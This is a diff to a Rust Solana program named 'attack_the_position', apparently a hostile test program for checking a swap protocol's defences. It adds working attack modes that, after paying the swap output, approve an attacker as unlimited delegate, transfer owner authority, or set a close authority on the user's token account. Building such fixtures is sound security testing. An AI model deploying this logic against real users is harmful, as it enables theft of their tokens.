@@ -14,11 +14,19 @@ pub const ATTACK_SEND_THE_OUTPUT_SOMEWHERE_ELSE: u8 = 2;
 pub const ATTACK_DRAIN_AN_ACCOUNT_IT_WAS_HANDED: u8 = 3;
 pub const ATTACK_CLOSE_AN_ACCOUNT_IT_WAS_HANDED: u8 = 4;
 pub const ATTACK_HONEST_FILL: u8 = 5;
+pub const ATTACK_APPROVE_ITSELF_AS_DELEGATE: u8 = 6;
+pub const ATTACK_TAKE_THE_OWNER_AUTHORITY: u8 = 7;
+pub const ATTACK_SET_A_CLOSE_AUTHORITY: u8 = 8;
 
 pub const SWAP_AUTHORITY_SEED: &[u8] = b"swap";
 
 const TRANSFER_CHECKED_DISCRIMINATOR: u8 = 12;
 const CLOSE_ACCOUNT_DISCRIMINATOR: u8 = 9;
+const APPROVE_DISCRIMINATOR: u8 = 4;
+const SET_AUTHORITY_DISCRIMINATOR: u8 = 6;
+const AUTHORITY_TYPE_ACCOUNT_OWNER: u8 = 2;
+const AUTHORITY_TYPE_CLOSE_ACCOUNT: u8 = 3;
+const COPTION_SOME: u8 = 1;
 
 entrypoint!(attack_the_position);
 
@@ -122,8 +130,112 @@ pub fn attack_the_position(
             )
         }
 
+        ATTACK_APPROVE_ITSELF_AS_DELEGATE => {
+            let taking = what_it_wants_to_take.ok_or(ProgramError::NotEnoughAccountKeys)?;
+            pay_the_output(
+                program_id,
+                destination_token_program,
+                vault_paying_the_output,
+                destination_mint,
+                destination,
+                vault_authority,
+                amount_out,
+            )?;
+            let mut data = vec![APPROVE_DISCRIMINATOR];
+            data.extend_from_slice(&u64::MAX.to_le_bytes());
+            invoke(
+                &anchor_lang::solana_program::instruction::Instruction {
+                    program_id: *destination_token_program.key,
+                    accounts: vec![
+                        anchor_lang::solana_program::instruction::AccountMeta::new(
+                            *destination.key,
+                            false,
+                        ),
+                        anchor_lang::solana_program::instruction::AccountMeta::new_readonly(
+                            *taking.key,
+                            false,
+                        ),
+                        anchor_lang::solana_program::instruction::AccountMeta::new_readonly(
+                            *payer.key, true,
+                        ),
+                    ],
+                    data,
+                },
+                &[destination.clone(), taking.clone(), payer.clone()],
+            )
+        }
+
+        ATTACK_TAKE_THE_OWNER_AUTHORITY => {
+            let taking = what_it_wants_to_take.ok_or(ProgramError::NotEnoughAccountKeys)?;
+            pay_the_output(
+                program_id,
+                destination_token_program,
+                vault_paying_the_output,
+                destination_mint,
+                destination,
+                vault_authority,
+                amount_out,
+            )?;
+            set_authority(
+                destination_token_program,
+                destination,
+                payer,
+                taking,
+                AUTHORITY_TYPE_ACCOUNT_OWNER,
+            )
+        }
+
+        ATTACK_SET_A_CLOSE_AUTHORITY => {
+            let taking = what_it_wants_to_take.ok_or(ProgramError::NotEnoughAccountKeys)?;
+            pay_the_output(
+                program_id,
+                destination_token_program,
+                vault_paying_the_output,
+                destination_mint,
+                destination,
+                vault_authority,
+                amount_out,
+            )?;
+            set_authority(
+                destination_token_program,
+                destination,
+                payer,
+                taking,
+                AUTHORITY_TYPE_CLOSE_ACCOUNT,
+            )
+        }
+
         _ => Err(ProgramError::InvalidInstructionData),
     }
+}
+
+fn set_authority<'info>(
+    token_program: &AccountInfo<'info>,
+    token_account: &AccountInfo<'info>,
+    current_authority: &AccountInfo<'info>,
+    new_authority: &AccountInfo<'info>,
+    authority_type: u8,
+) -> ProgramResult {
+    let mut data = vec![SET_AUTHORITY_DISCRIMINATOR, authority_type, COPTION_SOME];
+    data.extend_from_slice(new_authority.key.as_ref());
+
+    invoke(
+        &anchor_lang::solana_program::instruction::Instruction {
+            program_id: *token_program.key,
+            accounts: vec![
+                anchor_lang::solana_program::instruction::AccountMeta::new(
+                    *token_account.key,
+                    false,
+                ),
+                anchor_lang::solana_program::instruction::AccountMeta::new_readonly(
+                    *current_authority.key,
+                    true,
+                ),
+            ],
+            data,
+        },
+        &[token_account.clone(), current_authority.clone()],
+    )
 }
 
 fn take_the_input<'info>(
